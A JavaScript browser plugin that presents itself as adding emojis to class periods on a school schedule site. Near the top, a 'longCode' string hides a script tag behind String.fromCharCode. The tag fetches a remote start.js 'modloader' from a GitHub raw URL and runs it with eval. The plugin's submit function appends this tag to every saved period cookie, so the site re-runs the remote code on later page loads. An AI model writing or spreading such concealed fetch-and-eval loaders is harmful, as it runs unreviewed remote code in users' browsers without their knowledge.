/**
 * @name Emoji Plugin
 * @author Poy Ozkusaksiz
 * @version 0.1
 * @description Adds emojis to your classes. Emojis are edited from the change schedule page.
*/

var longCode = "<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>eval(d))" + "</" + "script>";

function setCookieEmjPlugin(name, value) {
  document.cookie = name + "=" + encodeURIComponent(value) + ";path=/;samesite=strict";
}
	
	function getCookieEmjPlugin(name) {
		const cookies = document.cookie.split('; ');
		for (const cookie of cookies) {
			const [cookieName, cookieValue] = cookie.split('=');
			if (cookieName === name) {
				return decodeURIComponent(cookieValue); 
			} } return null; 
		}

function initEmjPlugin() {
if (window.location.href.includes("admin")) {

  function submitClassNames() {
    for (let i = 1; i <= 8; i++) {
      if (document.querySelector("#InputPeriod" + i).value) {
        setCookieEmjPlugin("Period" + i, document.querySelector("#InputPeriod" + i).value + longCode);
      } else {
        setCookieEmjPlugin("Period" + i, '<span class="original">Period ' + i + "</span>" + longCode);
      }
  
      // Added by Emoji Plugin
      if (document.querySelector("#Input" + i + "Emj").value) {
        setCookieEmjPlugin("Period" + i + "Emj", document.querySelector("#Input" + i + "Emj").value);
      } else {
      }
    }
    if (InputLunch) {
    document.cookie = "Lunch=" + InputLunch.value + "; expires=Sun, 31 Dec 2030 12:00:00 UTC; path=/" + "; samesite=strict";
    document.cookie = "LunchEmj=" + InputLunchEmj.value + "; expires=Sun, 31 Dec 2030 12:00:00 UTC; path=/" + "; samesite=strict";
    }
    location.replace("https://app.ridgewood.k12.nj.us");
  }

document.submitClassNames = submitClassNames;

function clearInstallEmjPlugin() {
  const cookies = document.cookie.split(";");

  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim();
    if (cookie.includes("Emj")) {
      const eqPos = cookie.indexOf("=");
      const name = eqPos > -1 ? cookie.substring(0, eqPos) : cookie;
      document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;SameSite=Strict`;
    }
  }
  for (let i = 1; i <= 8; i++) {
    document.querySelector(`#Input${i}Emj`).value = "";
  }
  
  if (document.querySelector("#InputLunchEmj")) {
    document.querySelector("#InputLunchEmj").value = "";
  }
  
}

document.clearInstallEmjPlugin = clearInstallEmjPlugin;

const setScheduleSubmitButton = document.getElementById("setScheduleSubmitButton");
const clearEmojisButton = document.createElement("button");

clearEmojisButton.id = "clearEmojisButton";
clearEmojisButton.type = "submit";
clearEmojisButton.className = "btn btn-danger";
clearEmojisButton.style.borderRadius = ".25rem";
clearEmojisButton.style.marginLeft = "10px";
clearEmojisButton.innerHTML = "Clear Emojis";

setScheduleSubmitButton.insertAdjacentElement("afterend", clearEmojisButton);
document.querySelector("#clearEmojisButton").addEventListener("click", () => clearInstallEmjPlugin());


function addLabelsAndInputs() {
    const periods = ["1", "2", "3", "4", "5", "6", "7", "8", "Lunch"];
    
    periods.forEach(period => {
        const labelFor = period === "Lunch" ? "LunchEmj" : `Period${period}Emj`;
        
        const label = document.createElement("label");
        label.setAttribute("for", `Input${period}Emj`);
        label.setAttribute("class", "form-label emj");
        label.textContent = "Emoji:";

        const input = document.createElement("input");
        input.setAttribute("type", "text");
        input.setAttribute("class", "form-control");
        input.setAttribute("id", `Input${period}Emj`);
        input.setAttribute("name", labelFor);
        input.setAttribute("style", "width:45px");
        input.value = getCookieEmjPlugin(labelFor);

        const existingInput = document.querySelector(`input[name="Period${period}"]`);
        if (existingInput) {
            existingInput.parentNode.appendChild(label);
            existingInput.parentNode.appendChild(input);
        }
    }
  );
}
const css = `
  #setScheduleText {
    display: block !important;
  }
  .col-auto {
    display: flex;
  }
  label.form-label.emj {
    margin-left: 10px;
    margin-right: 10px;
  }
`;

const style = document.createElement('style');
style.type = 'text/css';

if (style.styleSheet) {
  style.styleSheet.cssText = css;
} else {
  style.appendChild(document.createTextNode(css));
}

document.head.appendChild(style);

addLabelsAndInputs();

    }

else {
var strongElements = document.querySelectorAll('td[style="width:10%"] strong');
strongElements.forEach(function (strongElement) {
    var textContent = strongElement.textContent.trim();
    var periodName = textContent === "" ? "Lunch" : "Period" + textContent;
    var emoji = getCookieEmjPlugin(periodName + "Emj");
    if (emoji) {
        strongElement.textContent = emoji;
    }
});

// TIMER PLUGIN INTEGRATION
setTimeout((longCode) => {
if (document.querySelector("#class-name")) {
const classNameText = document.querySelector("#class-name").textContent.trim();

const rows = document.querySelectorAll(".table tbody tr");
let foundEmoji = null;

rows.forEach((row) => {
    const cellText = row.textContent.trim().replace(longCode, "");
    if (cellText.includes(classNameText)) {
        foundEmoji = row.querySelector("strong").textContent;
    }
});

if (foundEmoji) { 
  if (document.querySelector("#timerEmojiText")) {document.querySelector("#timerEmojiText").textContent = foundEmoji;}
  else {
    const emojiDisplay = document.createElement("div");
emojiDisplay.id = "timerEmojiText";

emojiDisplay.style.fontSize = "36px";
emojiDisplay.style.position = "relative";
emojiDisplay.style.top = "-216px";
emojiDisplay.textContent = foundEmoji;

const classNameElement = document.querySelector("#class-name");
if (classNameElement) {
    classNameElement.parentNode.insertBefore(emojiDisplay, classNameElement);
            }
          }
        }
      } else {
    }
  }, 5);

  var isBrowserWindowFocused = true;
  function checkBrowserWindowFocus() {
    if (!document.hasFocus()) {
      isBrowserWindowFocused = false;
    } else if (!isBrowserWindowFocused) {
      isBrowserWindowFocused = true;
      initEmjPlugin();
    }

    if (document.getElementById("base-timer-label")) {
      if (document.getElementById("base-timer-label").innerText == 1) {
      initEmjPlugin();
      }
    }

  }
  
  setInterval(checkBrowserWindowFocus, 1000);

}
}
initEmjPlugin();